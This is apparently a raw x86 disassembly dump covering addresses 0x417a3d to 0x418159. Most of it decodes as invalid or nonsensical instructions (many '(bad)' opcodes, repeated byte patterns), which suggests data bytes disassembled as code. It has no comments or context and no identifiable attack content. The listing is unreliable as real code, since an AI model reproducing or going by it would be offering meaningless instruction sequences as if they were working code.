  417a3d:	sub    dl,BYTE PTR [eax+esi*1]
  417a40:	adc    ebx,DWORD PTR [eax+0xc]
  417a43:	nop
  417a44:	adc    ebx,DWORD PTR [eax+0x0]
  417a47:	adc    al,0x90
  417a49:	adc    ebx,DWORD PTR [eax+0xc]
  417a4c:	nop
  417a4d:	adc    ebx,DWORD PTR [eax+0x54]
  417a50:	nop
  417a51:	adc    ebx,DWORD PTR [eax+0x4c]
  417a54:	lock adc DWORD PTR [eax-0x64],ebx
  417a58:	pusha  
  417a59:	mov    ch,0x67
  417a5b:	pushf  
  417a5c:	retf   0x62e7
  417a5f:	cmp    DWORD PTR [esi+0x608d71ea],0xffffffbd
  417a66:	push   ebx
  417a67:	mov    DWORD PTR ds:0xe8c63ee,ebx
  417a6d:	loop   0x417ad5
  417a6f:	arpl   sp,cx
  417a71:	add    edi,DWORD PTR [esi]
  417a73:	ins    DWORD PTR es:[edi],dx
  417a74:	or     DWORD PTR [edi],esp
  417a76:	add    al,0x7
  417a78:	shl    DWORD PTR [esi],0x4
  417a7b:	ret    
  417a7c:	mov    esi,0xc2bd0426
  417a81:	es add al,0x2d
  417a84:	mov    bh,0x26
  417a86:	add    al,0xf
  417a88:	mov    ebp,0xb0250426
  417a8d:	es add al,0xae
  417a90:	scas   eax,DWORD PTR es:[edi]
  417a91:	es add al,0x38
  417a94:	scas   al,BYTE PTR es:[edi]
  417a95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a96:	add    ebp,DWORD PTR [ebx-0xdfc594c]
  417a9c:	mov    bl,0xa6
  417a9e:	add    edi,DWORD PTR [ebp+0x3a03a6b1]
  417aa4:	out    0xa6,eax
  417aa6:	add    ebx,DWORD PTR [esp+ebp*8-0x20fffc5a]
  417aad:	jmp    0xe9cf7e58
  417ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ab3:	add    eax,DWORD PTR [ebp-0x1f]
  417ab6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ab7:	add    eax,edi
  417ab9:	loopne 0x417a61
  417abb:	add    edi,DWORD PTR [ebx]
  417abd:	loopne 0x417a65
  417abf:	add    ebp,DWORD PTR [edx]
  417ac1:	fisub  WORD PTR [esi-0x592208fd]
  417ac7:	add    esi,DWORD PTR [ecx-0x1e]
  417aca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417acb:	add    ebx,DWORD PTR [ecx-0xffc5929]
  417ad1:	fsub   QWORD PTR [esi+0x26d5e403]
  417ad7:	add    al,0xaf
  417ad9:	(bad)  
  417ada:	es add al,0xaa
  417add:	xlat   BYTE PTR ds:[ebx]
  417ade:	es add al,0xc6
  417ae1:	shl    DWORD PTR [esi],1
  417ae3:	add    al,0x6b
  417ae5:	int    0x26
  417ae7:	add    al,0xd0
  417ae9:	int    0x26
  417aeb:	add    al,0x28
  417aed:	into   
  417aee:	jmp    FWORD PTR [eax]
  417af0:	xor    eax,0x2d297caf
  417af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417af6:	jge    0x417b21
  417af8:	xor    eax,0x2d2989d4
  417afd:	mov    BYTE PTR [ebx-0x7247cad7],cl
  417b03:	sub    DWORD PTR ds:0x352998cf,ebp
  417b09:	or     al,0x9c
  417b0b:	sub    DWORD PTR ds:0x299c92,ebp
  417b11:	xor    eax,0x2d299acb
  417b16:	dec    eax
  417b17:	fwait
  417b18:	test   eax,0xa99db932
  417b1d:	xor    ch,BYTE PTR ds:0xcf32a99e
  417b23:	pushf  
  417b24:	test   eax,0xa99d4d32
  417b29:	xor    dh,BYTE PTR [edi-0x7fcd5661]
  417b2f:	mov    al,ds:0xa83a32a9
  417b34:	test   eax,0xa9ae1432
  417b39:	xor    bl,bh
  417b3b:	lods   eax,DWORD PTR ds:[esi]
  417b3c:	test   eax,0xa9bd5832
  417b41:	xor    ah,BYTE PTR [ebx]
  417b43:	shr    BYTE PTR [ecx-0x56404dce],0x32
  417b4a:	shr    BYTE PTR [bx+di-0x9ce],0xbe
  417b50:	test   eax,0xa9bec132
  417b55:	xor    bl,al
  417b57:	mov    esi,0xbf333529
  417b5c:	sub    DWORD PTR ds:0x3529c296,ebp
  417b62:	adc    cl,al
  417b64:	sub    DWORD PTR ds:0x4800c2f2,ebp
  417b6a:	add    eax,0x548c594
  417b6f:	(bad)  
  417b70:	lds    ebx,FWORD PTR [eax]
  417b72:	add    eax,0x1800c64e
  417b77:	add    eax,0x508c7b1
  417b7c:	bswap  eax
  417b7e:	or     BYTE PTR ds:0x518c884,al
  417b84:	fwait
  417b85:	leave  
  417b86:	sbb    BYTE PTR ds:0x508ca15,al
  417b8c:	(bad)  
  417b8d:	int    0x8
  417b8f:	add    eax,0x558ce17
  417b94:	adc    ecx,0xd1e50558
  417b9a:	enter  0xbd0b,0xd5
  417b9e:	enter  0xcc0b,0xd7
  417ba2:	fmul   DWORD PTR [ebx]
  417ba4:	add    eax,0x520bd8da
  417ba9:	fcmove st,st(0)
  417bab:	or     eax,esi
  417bad:	fmul   st(0),st
  417baf:	or     ecx,DWORD PTR [ebx]
  417bb1:	fstp   QWORD PTR [eax-0x672276f5]
  417bb7:	or     edi,esp
  417bb9:	fisttp QWORD PTR [eax-0x772185f5]
  417bbf:	or     edi,eax
  417bc1:	ficomp WORD PTR [eax-0x671d8bf5]
  417bc7:	or     esp,edx
  417bc9:	loop   0x417b53
  417bcb:	or     ecx,DWORD PTR [edi]
  417bcd:	jecxz  0x417b57
  417bcf:	or     esi,ebp
  417bd1:	jecxz  0x417bab
  417bd3:	or     ch,BYTE PTR [edx]
  417bd5:	in     al,0xd8
  417bd7:	or     al,dh
  417bd9:	out    0x0,al
  417bdb:	dec    eax
  417bdc:	add    eax,0x548e6fc
  417be1:	xor    ah,bh
  417be3:	xor    DWORD PTR [eax],esp
  417be5:	add    al,0x6e
  417be7:	sbb    BYTE PTR [ecx],ah
  417be9:	add    al,0xd7
  417beb:	or     eax,0x7be0421
  417bf0:	and    DWORD PTR [ecx+ebp*2],eax
  417bf3:	in     al,0x20
  417bf5:	add    al,0x4a
  417bf7:	fbld   TBYTE PTR [eax]
  417bf9:	add    al,0x0
  417bfb:	xor    DWORD PTR [eax+0x1],esp
  417bfe:	add    BYTE PTR [ecx],dh
  417c00:	pusha  
  417c01:	add    DWORD PTR [eax],eax
  417c03:	xor    DWORD PTR [eax+0x1],esp
  417c06:	add    BYTE PTR [ecx],dh
  417c08:	pusha  
  417c09:	add    DWORD PTR [eax],eax
  417c0b:	xor    DWORD PTR [eax+0x1],esp
  417c0e:	inc    ecx
  417c0f:	inc    ebp
  417c10:	stc    
  417c11:	in     al,0x6d
  417c13:	and    eax,0x225ec940
  417c18:	or     BYTE PTR [ecx+edx*2],al
  417c1b:	add    eax,0x252b5a1
  417c20:	std    
  417c21:	enter  0xe14a,0xa6
  417c25:	scas   eax,DWORD PTR es:[edi]
  417c26:	push   ebx
  417c27:	push   esp
  417c28:	outs   dx,DWORD PTR ds:[esi]
  417c29:	enter  0x55ff,0x3c
  417c2d:	sub    esp,DWORD PTR [ebx-0x7]
  417c30:	inc    esp
  417c31:	add    DWORD PTR [ebx],esp
  417c33:	and    DWORD PTR [edx-0x47],edx
  417c36:	jmp    edx
  417c38:	xchg   ecx,eax
  417c39:	(bad)  
  417c3a:	bound  esi,QWORD PTR [ecx]
  417c3c:	xchg   ebx,eax
  417c3d:	jmp    0x7c067ca4
  417c42:	(bad)  
  417c43:	ja     0x417c19
  417c45:	adc    dh,0x73
  417c48:	int3   
  417c49:	mov    al,ds:0x82d35f01
  417c4e:	in     eax,0x2d
  417c50:	rol    DWORD PTR [eax+0x6939ffd5],cl
  417c56:	push   cs
  417c57:	or     dh,BYTE PTR [edx+ebp*2]
  417c5a:	or     ah,BYTE PTR [eax]
  417c5c:	pop    ebx
  417c5d:	or     DWORD PTR [eax-0x12],edx
  417c60:	mov    DWORD PTR [ecx],ebp
  417c62:	in     al,dx
  417c63:	or     eax,0xe84be551
  417c68:	add    BYTE PTR es:[edx*1+0xdf42951],al
  417c70:	cs loopne 0x417cb7
  417c73:	and    al,0x36
  417c75:	add    BYTE PTR [edi],al
  417c77:	loope  0x417cd7
  417c79:	loopne 0x417cb4
  417c7b:	sar    BYTE PTR [esi],1
  417c7d:	add    bh,al
  417c7f:	and    edx,DWORD PTR [ecx]
  417c81:	and    al,0xd8
  417c83:	and    edx,DWORD PTR [ecx]
  417c85:	add    bh,al
  417c87:	and    ecx,DWORD PTR [esi+ebx*8+0x12]
  417c8b:	jmp    0x417cab
  417c8d:	add    ah,dh
  417c8f:	and    ecx,DWORD PTR [esi-0x1d]
  417c92:	adc    DWORD PTR [ecx],ecx
  417c94:	cmp    ebp,DWORD PTR [ecx]
  417c96:	or     esp,ecx
  417c98:	sbb    ch,BYTE PTR [ecx]
  417c9a:	loopne 0x417cbf
  417c9c:	push   ecx
  417c9d:	and    al,0x17
  417c9f:	and    al,0x31
  417ca1:	sub    DWORD PTR [edi],eax
  417ca3:	and    al,0x0
  417ca5:	push   ecx
  417ca6:	sub    ecx,DWORD PTR [edi+edx*8]
  417ca9:	push   eax
  417caa:	sub    DWORD PTR [edi],eax
  417cac:	and    al,0x31
  417cae:	fcmove st,st(6)
  417cb0:	loopne 0x417cbc
  417cb2:	(bad)  
  417cb4:	adc    eax,0xe7c2e51f
  417cb9:	dec    bp
  417cbb:	out    0x3,eax
  417cbd:	xor    DWORD PTR [ecx],ecx
  417cbf:	out    0x3,eax
  417cc1:	xor    DWORD PTR [ecx],ecx
  417cc3:	out    0x3,eax
  417cc5:	xor    DWORD PTR [ecx],ecx
  417cc7:	out    0x3,eax
  417cc9:	xor    DWORD PTR [ecx],ecx
  417ccb:	out    0x3,eax
  417ccd:	xor    DWORD PTR [ecx],ecx
  417ccf:	out    0x3,eax
  417cd1:	xor    DWORD PTR [ecx],ecx
  417cd3:	out    0x3,eax
  417cd5:	xor    DWORD PTR [ecx],ecx
  417cd7:	add    cl,ch
  417cd9:	xor    cl,BYTE PTR [ecx]
  417cdb:	add    cl,ch
  417cdd:	xor    cl,BYTE PTR [ecx]
  417cdf:	add    cl,ch
  417ce1:	xor    cl,BYTE PTR [ecx]
  417ce3:	add    cl,ch
  417ce5:	xor    cl,BYTE PTR [ecx]
  417ce7:	add    cl,ch
  417ce9:	xor    cl,BYTE PTR [ecx]
  417ceb:	add    cl,ch
  417ced:	xor    cl,BYTE PTR [ecx]
  417cef:	add    cl,ch
  417cf1:	xor    cl,BYTE PTR [ecx]
  417cf3:	add    cl,ch
  417cf5:	xor    cl,BYTE PTR [ecx]
  417cf7:	add    cl,ch
  417cf9:	xor    cl,BYTE PTR [ecx]
  417cfb:	add    cl,ch
  417cfd:	xor    cl,BYTE PTR [ecx]
  417cff:	add    cl,ch
  417d01:	xor    cl,BYTE PTR [ecx]
  417d03:	add    cl,ch
  417d05:	xor    cl,BYTE PTR [ecx]
  417d07:	add    cl,ch
  417d09:	add    BYTE PTR [edx],dh
  417d0b:	or     DWORD PTR [eax],eax
  417d0d:	jmp    0xe9418644
  417d12:	xor    cl,BYTE PTR [ecx]
  417d14:	add    cl,ch
  417d16:	xor    cl,BYTE PTR [ecx]
  417d18:	add    cl,ch
  417d1a:	xor    cl,BYTE PTR [ecx]
  417d1c:	add    cl,ch
  417d1e:	xor    cl,BYTE PTR [ecx]
  417d20:	add    cl,ch
  417d22:	xor    cl,BYTE PTR [ecx]
  417d24:	add    cl,ch
  417d26:	xor    cl,BYTE PTR [ecx]
  417d28:	add    cl,ch
  417d2a:	xor    cl,BYTE PTR [ecx]
  417d2c:	add    cl,ch
  417d2e:	xor    cl,BYTE PTR [ecx]
  417d30:	add    cl,ch
  417d32:	xor    cl,BYTE PTR [ecx]
  417d34:	add    cl,ch
  417d36:	xor    cl,BYTE PTR [ecx]
  417d38:	add    cl,ch
  417d3a:	xor    cl,BYTE PTR [ecx]
  417d3c:	add    cl,ch
  417d3e:	xor    cl,BYTE PTR [ecx]
  417d40:	add    cl,ch
  417d42:	xor    cl,BYTE PTR [ecx]
  417d44:	add    cl,ch
  417d46:	xor    cl,BYTE PTR [ecx]
  417d48:	add    cl,ch
  417d4a:	xor    cl,BYTE PTR [ecx]
  417d4c:	add    cl,ch
  417d4e:	xor    cl,BYTE PTR [ecx]
  417d50:	add    BYTE PTR [eax],al
  417d52:	dec    eax
  417d53:	or     BYTE PTR [eax],al
  417d55:	add    BYTE PTR [eax],bl
  417d57:	or     BYTE PTR [eax],al
  417d59:	add    BYTE PTR [eax],bl
  417d5b:	or     BYTE PTR [eax],al
  417d5d:	add    BYTE PTR [eax],cl
  417d5f:	or     BYTE PTR [eax],al
  417d61:	add    BYTE PTR [eax],cl
  417d63:	or     BYTE PTR [eax],al
  417d65:	add    BYTE PTR [eax],bl
  417d67:	or     BYTE PTR [eax],al
  417d69:	add    BYTE PTR [eax],bl
  417d6b:	or     BYTE PTR [eax],al
  417d6d:	add    BYTE PTR [eax],al
  417d6f:	or     BYTE PTR [eax],cl
  417d71:	add    BYTE PTR [eax],al
  417d73:	or     BYTE PTR [eax],cl
  417d75:	add    BYTE PTR [eax],al
  417d77:	fadd   DWORD PTR [edi]
  417d79:	add    BYTE PTR [eax],al
  417d7b:	fadd   DWORD PTR [edi]
  417d7d:	add    BYTE PTR [eax],al
  417d7f:	enter  0x7,0x0
  417d83:	enter  0x7,0x0
  417d87:	fadd   DWORD PTR [edi]
  417d89:	add    BYTE PTR [eax],al
  417d8b:	fadd   DWORD PTR [edi]
  417d8d:	add    BYTE PTR [eax],al
  417d8f:	enter  0x7,0x0
  417d93:	enter  0x7,0x0
  417d97:	cwde   
  417d98:	pop    es
  417d99:	add    BYTE PTR [eax],al
  417d9b:	cwde   
  417d9c:	pop    es
  417d9d:	add    BYTE PTR [eax],al
  417d9f:	mov    BYTE PTR [edi],al
  417da1:	add    BYTE PTR [eax],al
  417da3:	mov    BYTE PTR [edi],al
  417da5:	add    BYTE PTR [eax],al
  417da7:	cwde   
  417da8:	pop    es
  417da9:	add    BYTE PTR [eax],al
  417dab:	cwde   
  417dac:	pop    es
  417dad:	add    BYTE PTR [eax],al
  417daf:	mov    BYTE PTR [edi],al
  417db1:	add    BYTE PTR [eax],al
  417db3:	mov    BYTE PTR [edi],al
  417db5:	add    BYTE PTR [eax],al
  417db7:	pop    eax
  417db8:	pop    es
  417db9:	add    BYTE PTR [eax],al
  417dbb:	pop    eax
  417dbc:	pop    es
  417dbd:	add    BYTE PTR [eax],al
  417dbf:	dec    eax
  417dc0:	pop    es
  417dc1:	add    BYTE PTR [eax],al
  417dc3:	dec    eax
  417dc4:	pop    es
  417dc5:	add    BYTE PTR [eax],al
  417dc7:	pop    eax
  417dc8:	pop    es
  417dc9:	add    BYTE PTR [eax],al
  417dcb:	xor    DWORD PTR [edx+0x1],esp
  417dce:	add    BYTE PTR [ecx],dh
  417dd0:	bound  eax,QWORD PTR [ecx]
  417dd2:	add    BYTE PTR [eax],al
  417dd4:	xor    DWORD PTR [edx+0x1],esp
  417dd7:	add    BYTE PTR [ecx],dh
  417dd9:	pusha  
  417dda:	add    DWORD PTR [eax],eax
  417ddc:	xor    DWORD PTR [eax+0x1],esp
  417ddf:	add    BYTE PTR [ecx],dh
  417de1:	pusha  
  417de2:	add    DWORD PTR [eax],eax
  417de4:	xor    DWORD PTR [eax+0x1],esp
  417de7:	add    BYTE PTR [ecx],dh
  417de9:	pusha  
  417dea:	add    DWORD PTR [eax],eax
  417dec:	xor    DWORD PTR [eax+0x1],esp
  417def:	add    BYTE PTR [ecx],dh
  417df1:	pusha  
  417df2:	add    DWORD PTR [eax],eax
  417df4:	xor    DWORD PTR [eax+0x1],esp
  417df7:	add    BYTE PTR [ecx],dh
  417df9:	pusha  
  417dfa:	add    DWORD PTR [eax],eax
  417dfc:	xor    DWORD PTR [eax+0x1],esp
  417dff:	add    BYTE PTR [ecx],dh
  417e01:	pusha  
  417e02:	add    DWORD PTR [eax],eax
  417e04:	xor    DWORD PTR [eax+0x1],esp
  417e07:	add    BYTE PTR [ecx],dh
  417e09:	pusha  
  417e0a:	add    DWORD PTR [eax],eax
  417e0c:	xor    DWORD PTR [eax+0x1],esp
  417e0f:	add    BYTE PTR [ecx],dh
  417e11:	pusha  
  417e12:	add    DWORD PTR [eax],eax
  417e14:	xor    DWORD PTR [eax+0x1],esp
  417e17:	add    BYTE PTR [ecx],dh
  417e19:	pusha  
  417e1a:	add    DWORD PTR [eax],eax
  417e1c:	xor    DWORD PTR [eax+0x1],esp
  417e1f:	add    BYTE PTR [ecx],dh
  417e21:	pusha  
  417e22:	add    DWORD PTR [eax],eax
  417e24:	xor    DWORD PTR [eax+0x1],esp
  417e27:	add    BYTE PTR [ecx],dh
  417e29:	pusha  
  417e2a:	add    DWORD PTR [eax],eax
  417e2c:	xor    DWORD PTR [eax+0x1],esp
  417e2f:	add    BYTE PTR [ecx],dh
  417e31:	pusha  
  417e32:	add    DWORD PTR [eax],eax
  417e34:	xor    DWORD PTR [eax+0x1],esp
  417e37:	add    BYTE PTR [eax],al
  417e39:	xor    DWORD PTR [eax+0x1],esp
  417e3c:	add    BYTE PTR [ecx],dh
  417e3e:	pusha  
  417e3f:	add    DWORD PTR [eax],eax
  417e41:	xor    DWORD PTR [ecx+0x24],esp
  417e44:	inc    ebx
  417e45:	into   
  417e46:	or     BYTE PTR [eax-0x54],dh
  417e49:	jp     0x417ea5
  417e4b:	sbb    eax,0x9d718b37
  417e50:	scas   eax,DWORD PTR es:[edi]
  417e51:	add    cl,bh
  417e53:	pop    edi
  417e54:	lods   al,BYTE PTR ds:[esi]
  417e55:	push   0x5a
  417e57:	call   0x6723f080
  417e5c:	add    esi,DWORD PTR [ecx+0x9]
  417e5f:	mov    DWORD PTR [ebx],0x3df0941
  417e65:	sub    eax,0xe03e909
  417e6a:	dec    edx
  417e6b:	out    0x3,eax
  417e6d:	mov    cl,0x8
  417e6f:	out    0x3,eax
  417e71:	jno    0x417e7c
  417e73:	out    0x3,eax
  417e75:	push   ecx
  417e76:	or     edi,esp
  417e78:	add    eax,DWORD PTR [ecx+0x9]
  417e7b:	out    0x3,eax
  417e7d:	cmp    DWORD PTR [ecx],ecx
  417e7f:	out    0x3,eax
  417e81:	xor    eax,0x3303e709
  417e86:	or     edi,esp
  417e88:	add    ecx,esi
  417e8a:	dec    ecx
  417e8b:	out    0x83,eax
  417e8d:	xor    DWORD PTR [ecx],ecx
  417e8f:	out    0xc3,eax
  417e91:	mov    esi,0x3123e749
  417e96:	or     edi,esp
  417e98:	repz scas al,BYTE PTR es:[edi]
  417e9a:	dec    ecx
  417e9b:	out    0xb,eax
  417e9d:	add    BYTE PTR [ecx],dh
  417e9f:	or     edi,esp
  417ea1:	call   FWORD PTR [esi+0x3101e749]
  417ea7:	or     edi,esp
  417ea9:	add    al,0x31
  417eab:	or     DWORD PTR [edi+0x4],esp
  417eae:	xor    DWORD PTR [ecx],ecx
  417eb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417eb1:	add    esi,DWORD PTR [ecx]
  417eb3:	or     DWORD PTR [edi],eax
  417eb5:	add    al,0x31
  417eb7:	or     edi,edx
  417eb9:	add    esi,DWORD PTR [ecx]
  417ebb:	or     edi,ebp
  417ebd:	add    esi,DWORD PTR [ecx]
  417ebf:	or     DWORD PTR [eax],eax
  417ec1:	in     eax,dx
  417ec2:	xor    cl,BYTE PTR [ecx]
  417ec4:	add    bl,ch
  417ec6:	xor    cl,BYTE PTR [ecx]
  417ec8:	add    al,ch
  417eca:	xor    cl,BYTE PTR [ecx]
  417ecc:	add    cl,ah
  417ece:	and    ah,BYTE PTR [ecx]
  417ed0:	and    cl,dh
  417ed2:	inc    edx
  417ed3:	add    DWORD PTR [eax],eax
  417ed5:	rcr    BYTE PTR ds:0x25e01f22,1
  417edb:	adc    bh,bh
  417edd:	ret    0xf340
  417ee0:	and    ebx,edx
  417ee2:	and    BYTE PTR [ebx],dl
  417ee4:	add    dh,BYTE PTR [edx+0x2720f243]
  417eea:	aas    
  417eeb:	mul    DWORD PTR ds:0x61714ff
  417ef1:	adc    al,0x20
  417ef3:	hlt    
  417ef4:	and    ch,ah
  417ef6:	add    DWORD PTR [ebx+eax*1],edx
  417ef9:	add    eax,0xdd23f541
  417efe:	(bad)  
  417eff:	adc    al,0x4
  417f01:	rol    BYTE PTR [eax],cl
  417f03:	jecxz  0x417f16
  417f05:	add    eax,ebp
  417f07:	xor    BYTE PTR ds:0x1538f106,cl
  417f0d:	push   cs
  417f0e:	out    dx,al
  417f0f:	mov    ebp,0xbdfe1319
  417f14:	and    DWORD PTR [esp+ebx*8],ebx
  417f17:	ret    0x1512
  417f1a:	jmp    0xef5a89cd
  417f1f:	xor    DWORD PTR ds:0x11a0df07,ebx
  417f25:	add    eax,edx
  417f27:	xchg   edi,eax
  417f28:	adc    eax,0x14820306
  417f2d:	call   DWORD PTR [eax]
  417f2f:	and    ah,BYTE PTR [edi]
  417f31:	and    al,0x7
  417f33:	das    
  417f34:	and    al,0x25
  417f36:	sbb    ecx,DWORD PTR [ecx-0x17]
  417f39:	sub    al,0x0
  417f3b:	inc    ebx
  417f3c:	sbb    eax,0x19393726
  417f41:	sub    DWORD PTR [ecx],ebp
  417f43:	pop    ecx
  417f44:	jmp    0x417f61
  417f46:	pop    ds
  417f47:	dec    eax
  417f48:	dec    eax
  417f49:	inc    BYTE PTR [eax]
  417f4b:	pop    eax
  417f4c:	or     al,0x0
  417f4e:	add    BYTE PTR [eax+0xc],bl
  417f51:	std    
  417f52:	dec    DWORD PTR [eax+ecx*2-0x2]
  417f56:	add    BYTE PTR [esp+ecx*1-0x3],cl
  417f5a:	add    BYTE PTR [eax+ecx*2],bl
  417f5d:	(bad)  
  417f5e:	dec    DWORD PTR [esp+ecx*1]
  417f61:	add    BYTE PTR [eax],al
  417f63:	or     BYTE PTR [edi*8+0x480800ff],cl
  417f6a:	std    
  417f6b:	call   FWORD PTR [eax]
  417f6d:	dec    eax
  417f6e:	inc    BYTE PTR [eax]
  417f70:	or     al,0x48
  417f72:	inc    BYTE PTR [eax]
  417f74:	or     BYTE PTR [eax-0x3],cl
  417f77:	dec    DWORD PTR [eax+ecx*2]
  417f7a:	std    
  417f7b:	add    ah,bl
  417f7d:	or     edi,ebp
  417f7f:	add    al,bl
  417f81:	or     eax,DWORD PTR [eax]
  417f83:	add    esp,ecx
  417f85:	or     eax,DWORD PTR [eax]
  417f87:	add    ah,cl
  417f89:	inc    edi
  417f8a:	std    
  417f8b:	(bad)  
  417f8c:	fadd   DWORD PTR [edi-0x3]
  417f8f:	add    al,bl
  417f91:	inc    edi
  417f92:	std    
  417f93:	add    al,cl
  417f95:	inc    edi
  417f96:	(bad)  
  417f97:	dec    eax
  417f99:	inc    edi
  417f9a:	(bad)  
  417f9b:	call   FWORD PTR [eax-0x67ff02f5]
  417fa1:	or     edi,ebp
  417fa3:	add    BYTE PTR [edi+eax*2+0xb8c00fd],cl
  417faa:	std    
  417fab:	call   FWORD PTR [ebx+ecx*1+0xb8c0100]
  417fb2:	add    BYTE PTR [ecx],al
  417fb4:	xor    DWORD PTR [esi],esi
  417fb6:	add    edi,edi
  417fb8:	jbe    0x417feb
  417fba:	add    DWORD PTR [eax],eax
  417fbc:	xor    DWORD PTR [esi],esi
  417fbe:	std    
  417fbf:	jmp    DWORD PTR [esi+0x2d]
  417fc2:	std    
  417fc3:	(bad)  
  417fc4:	pop    esi
  417fc5:	xor    DWORD PTR [ecx],eax
  417fc7:	add    BYTE PTR [eax],dh
  417fc9:	xor    al,BYTE PTR [ecx]
  417fcb:	inc    DWORD PTR [eax]
  417fcd:	dec    esi
  417fce:	xor    eax,0x2e31fefd
  417fd3:	add    DWORD PTR [eax],eax
  417fd5:	xor    DWORD PTR [edx],esi
  417fd7:	add    edi,edi
  417fd9:	xor    DWORD PTR [edx],esi
  417fdb:	std    
  417fdc:	(bad)  
  417fdd:	xor    DWORD PTR [eax],esi
  417fdf:	add    DWORD PTR [eax],eax
  417fe1:	xor    BYTE PTR [eax],dh
  417fe3:	add    DWORD PTR [eax],eax
  417fe5:	xor    BYTE PTR [eax],dh
  417fe7:	std    
  417fe8:	call   DWORD PTR [esi]
  417fea:	sub    eax,0x3031ff01
  417fef:	add    edi,edi
  417ff1:	push   es
  417ff2:	xor    ebp,edi
  417ff4:	(bad)  
  417ff5:	(bad)  
  417ff6:	xor    al,0x1
  417ff8:	add    BYTE PTR [eax],dh
  417ffa:	xor    ch,bh
  417ffc:	(bad)  
  417ffd:	out    dx,al
  417ffe:	xor    al,0x1
  418000:	add    BYTE PTR [ecx],dh
  418002:	sub    al,0xfd
  418004:	push   DWORD PTR [ecx]
  418006:	xor    al,0xfd
  418008:	(bad)  
  418009:	(bad)  
  41800a:	sub    al,0xfd
  41800c:	(bad)  
  41800d:	xor    DWORD PTR [ecx+eax*1],esi
  418010:	inc    esi
  418012:	xor    BYTE PTR [ecx],al
  418014:	push   DWORD PTR [ecx]
  418016:	xor    al,0xfd
  418018:	push   DWORD PTR [ecx]
  41801a:	sub    al,0x1
  41801c:	add    BYTE PTR [eax],dh
  41801e:	xor    al,0xfd
  418020:	jmp    DWORD PTR [esi-0x610102d4]
  418026:	xor    ch,bh
  418028:	(bad)  
  418029:	xor    DWORD PTR [edi*8-0x18f67101],ebp
  418030:	inc    DWORD PTR [eax]
  418032:	xchg   BYTE PTR [ecx],cl
  418034:	out    0xff,eax
  418036:	jle    0x418041
  418038:	out    0x3,eax
  41803a:	xor    DWORD PTR [ecx],ecx
  41803c:	jecxz  0x418041
  41803e:	outs   dx,BYTE PTR ds:[esi]
  41803f:	inc    esi
  418040:	out    0xff,eax
  418042:	addr16 inc esi
  418044:	out    0x3,eax
  418046:	xor    DWORD PTR [ecx],ecx
  418048:	jmp    0x41804d
  41804a:	push   esi
  41804b:	or     DWORD PTR [edi],eax
  41804d:	test   BYTE PTR [ecx],ah
  41804f:	mov    edi,esp
  418051:	xor    DWORD PTR [ecx],0xffffff89
  418054:	out    0x83,eax
  418056:	xor    DWORD PTR [ecx],ecx
  418058:	mov    DWORD PTR [ebx+0x3e70921],0x3c70941
  418062:	xor    DWORD PTR [ecx],ecx
  418064:	mov    DWORD PTR [ebx],0x83c78941
  41806a:	xor    DWORD PTR [ecx-0x76cefc39],ecx
  418070:	pop    es
  418071:	test   BYTE PTR [ecx],ah
  418073:	mov    edi,esp
  418075:	and    DWORD PTR [ecx],0xffffff89
  418078:	out    0x3,eax
  41807a:	xor    DWORD PTR [ecx-0x76ce7c19],ecx
  418080:	out    0x3,eax
  418082:	inc    ecx
  418083:	or     DWORD PTR [edi],eax
  418085:	add    al,0x31
  418087:	or     DWORD PTR [edi],eax
  418089:	add    al,0x41
  41808b:	mov    edi,esp
  41808d:	and    DWORD PTR [ecx],0x9
  418090:	mov    DWORD PTR [ebx],0x83c70921
  418096:	add    BYTE PTR [ecx],dh
  418098:	mov    edi,esp
  41809a:	add    esi,DWORD PTR [ecx]
  41809c:	or     edi,esp
  41809e:	add    esi,DWORD PTR [ecx]
  4180a0:	mov    edi,esp
  4180a2:	xor    DWORD PTR [ecx],0x9
  4180a5:	mov    DWORD PTR [ebx-0x16fff6bf],0xc9801932
  4180af:	xor    bl,BYTE PTR [ecx]
  4180b1:	add    BYTE PTR [ecx],cl
  4180b3:	sub    eax,0x32e98009
  4180b8:	or     DWORD PTR [eax],eax
  4180ba:	jmp    0x9419971
  4180bf:	mov    ch,0x8
  4180c1:	add    cl,ch
  4180c3:	mov    dl,0x18
  4180c5:	sub    cl,0x32
  4180c8:	sbb    DWORD PTR [eax+0x8ad09],eax
  4180ce:	jmp    0xc9418a05
  4180d3:	mov    dl,0x18
  4180d5:	add    cl,cl
  4180d7:	xor    bl,BYTE PTR [ecx]
  4180d9:	sub    cl,0x32
  4180dc:	sbb    DWORD PTR [eax],eax
  4180de:	leave  
  4180df:	mov    dl,0x9
  4180e1:	sub    cl,0x32
  4180e4:	sbb    DWORD PTR [eax-0x7fe64d17],eax
  4180ea:	jmp    0xe9418aa1
  4180ef:	xor    bl,BYTE PTR [ecx]
  4180f1:	sub    cl,0xb2
  4180f4:	or     DWORD PTR [eax+0x93509],eax
  4180fa:	or     DWORD PTR [eax],eax
  4180fc:	lods   eax,DWORD PTR ds:[esi]
  4180fd:	sbb    DWORD PTR [eax+0x19b509],eax
  418103:	or     DWORD PTR ds:0xb2e90009,ebp
  418109:	or     DWORD PTR [eax],eax
  41810b:	jmp    0x9c18a42
  418110:	mov    ch,0x9
  418112:	add    cl,ch
  418114:	mov    dl,0x19
  418116:	sub    cl,0x32
  418119:	sbb    DWORD PTR [eax],eax
  41811b:	leave  
  41811c:	xor    cl,BYTE PTR [ecx]
  41811e:	or     cl,0x32
  418121:	sbb    DWORD PTR [eax],eax
  418123:	add    BYTE PTR [eax-0x78],bh
  418126:	add    BYTE PTR [eax-0x7ffff798],al
  41812c:	push   0x98001008
  418131:	mov    BYTE PTR [eax],dl
  418133:	add    BYTE PTR [eax-0x77fffff8],bl
  418139:	mov    BYTE PTR [eax],al
  41813b:	sub    BYTE PTR [eax],0x8d
  41813e:	add    BYTE PTR [eax],al
  418140:	pop    eax
  418141:	or     BYTE PTR [eax],al
  418143:	cmp    BYTE PTR [eax],0xd
  418146:	adc    BYTE PTR [eax-0x7fef72d8],al
  41814c:	dec    eax
  41814d:	mov    BYTE PTR [eax],dl
  41814f:	add    BYTE PTR [eax+0xe],dl
  418152:	add    BYTE PTR [eax],al
  418154:	pop    eax
  418155:	push   cs
  418156:	add    cl,BYTE PTR [eax]
  418158:	dec    eax
  418159:	or     BYTE PTR [eax],al
